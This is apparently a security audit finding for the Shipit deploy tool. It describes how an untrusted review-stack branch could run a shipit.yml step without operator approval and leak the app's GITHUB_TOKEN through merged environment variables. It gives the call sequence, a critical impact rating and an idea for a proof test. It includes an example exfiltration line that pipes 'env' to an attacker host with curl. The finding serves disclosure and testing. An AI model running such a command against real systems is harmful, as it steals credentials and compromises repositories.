Target: Shipit::Command#unbundled_env merging BASE_ENV, Shipit.shell_paths, and @env (TaskCommands#env which includes GITHUB_TOKEN via Shipit::Commands#base_env). Attacker action: a shipit.yml step on an attacker-provisioned review stack branch that echoes environment variables, e.g. 'env | curl -d @- http://attacker/collect'. Preconditions: stack was created/unarchived through the provision?/unarchive? precedence bug described above so the step executes without operator approval. Call sequence: TaskCommands#env merges Commands#base_env (GITHUB_TOKEN, GIT_ASKPASS) with @stack.env and @task.env -> Command#start spawns PTY with that merged env -> attacker's shell step reads ENV. Binding: the set of env keys spawned by Command#unbundled_env == the set of env keys an authorized operator intended to expose to this untrusted branch's steps (should be none/allow-listed, but is the full base_env including GITHUB_TOKEN). Impact: Critical, exfiltration of GITHUB_TOKEN belonging to the app-level GitHub credential, from a repository whose maintainers never enabled review stacks. Proof idea: minitest with WebMock stubbing the outbound curl, asserting the request body contains the stubbed GITHUB_TOKEN value configured via Shipit.github(organization:).token when the malicious step is embedded in deploy_steps.
